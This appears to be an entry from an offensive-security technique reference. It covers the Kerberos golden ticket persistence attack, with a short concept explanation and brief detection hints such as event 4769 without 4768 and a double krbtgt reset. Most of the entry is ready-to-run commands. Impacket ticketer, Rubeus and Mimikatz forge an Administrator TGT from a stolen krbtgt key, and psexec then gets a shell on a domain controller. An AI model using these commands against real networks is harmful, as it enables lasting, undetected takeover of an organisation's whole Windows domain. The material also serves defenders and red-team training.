---
id: golden
type: technique
label: "Golden ticket"
phase: "persist"
tools: ["mimikatz", "rubeus"]
cve: null
detect: "A 4769 with no matching 4768; a TGT lifetime outside domain policy."
mitre: "T1558.001"
tag: null
---


# Golden ticket

### Affected object / attribute
**`krbtgt` account** key (NT hash or AES).

### Concept (deep)
Forge a **TGT** with the `krbtgt` key: any user, any group, any lifetime. Survives resets of other accounts; only a **double krbtgt reset** invalidates it.

### Exhaustive commands
```bash
# ── Impacket ticketer ────────────────────────────────────────────────
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-X \
  -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local

# ── Rubeus (AES256 preferred) ────────────────────────────────────────
Rubeus.exe golden /aes256:<key> /user:Administrator \
  /domain:corp.local /sid:S-1-5-21-X /ptt

# ── Mimikatz ─────────────────────────────────────────────────────────
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-X /krbtgt:<hash> /ptt
```

### Detection
**4769 without 4768**; TGT lifetime > domain policy; `krbtgt` password age anomaly; rotate **twice**.

---
